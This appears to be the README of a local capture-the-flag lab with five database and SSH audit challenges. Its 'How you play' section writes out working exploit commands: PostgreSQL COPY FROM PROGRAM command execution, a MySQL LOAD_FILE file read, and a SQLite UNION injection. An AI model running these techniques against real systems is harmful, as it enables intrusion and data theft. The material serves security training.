# The Audit

> A database & SSH security-audit slice. Five findings across real PostgreSQL,
> MySQL/MariaDB, SQLite and SSH — four you exploit live, one you reconstruct from
> the logs.

Built to fill a gap: the other ranges in this series had no database challenges.
**The Audit** is a small jeopardy slice of real services you audit and break.
Flags `AUD{...}`.

| # | Finding | Class | Target |
|---|---------|-------|--------|
| 1 | **The Query Plan** | **PostgreSQL `COPY ... FROM PROGRAM` RCE** — a weak superuser password + a feature that runs shell commands (CVE-2019-9193 class) | `postgres:5432` |
| 2 | **The Dump** | **MySQL/MariaDB `FILE` + `secure_file_priv=""`** — an over-privileged app user reads any host file via `LOAD_FILE()` | `mariadb:3306` |
| 3 | **The Catalog** | **SQLite UNION injection** — the product API concatenates `id` into SQL; dump the secret vault | `webapp:80` |
| 4 | **The Backdoor Key** | **Leaked SSH private key** — a passphrase-less key left in the app's exposed backup dir authenticates `dbadmin` | `ssh:22` |
| 5 | **The Audit Trail** | **Forensics** — correlate the SSH breach with the exfiltrating DB session in the audit logs and decode what was stolen | `scoreboard:80/audit/` |

Challenges 1–4 are **live exploits** against the real daemons. Challenge 5 is a
**forensic "audit the logs"** task: an SSH auth log and a Postgres audit log,
where the flag is the secret the attacker exfiltrated.

## Run it

```bash
make up        # build + start every service + the scoreboard
make check     # run the full solver in-network and prove all 5 flags, exit 0
make down      # stop + remove everything
```

- **Scoreboard:** http://localhost:8505 — findings + flag submission + the C5 logs
- **Web app:** http://localhost:8096 — the SQLi target (C3)
- **Postgres:** `localhost:55432` · **MySQL:** `localhost:33306` · **SSH:** `localhost:2222`

Ports are overridable: `PG_PORT`, `MY_PORT`, `APP_PORT`, `SSH_PORT`, `SB_PORT`.

## How you play

Everything is a real service. Connect with `psql` / `mysql` / `curl` / `ssh` and
audit it:

```bash
PGPASSWORD=postgres psql -h localhost -p 55432 -U postgres \
  -c "CREATE TABLE p(d text); COPY p FROM PROGRAM 'cat /flag'; SELECT * FROM p;"
mysql -h 127.0.0.1 -P 33306 -u appuser -pappuser -e "SELECT LOAD_FILE('/flag')"
curl "http://localhost:8096/api/product?id=0 UNION SELECT id,k,v FROM ops_secret_vault--"
```

For C4, grab the key the app leaks at `/backup/id_ed25519` and `ssh` in. For C5,
read the two logs on the scoreboard and reconstruct the breach. See
[challenge/BRIEF.md](challenge/BRIEF.md).

## Organizer

- [organizer/FLAGS.md](organizer/FLAGS.md) — the findings & flag sheet
- [organizer/SOLUTION.md](organizer/SOLUTION.md) — the full walkthrough
- [organizer/DESIGN-NOTES.md](organizer/DESIGN-NOTES.md) — why it's built this way

> ⚠️ Every service here is deliberately misconfigured for training. Do not deploy
> any of it to a real network.
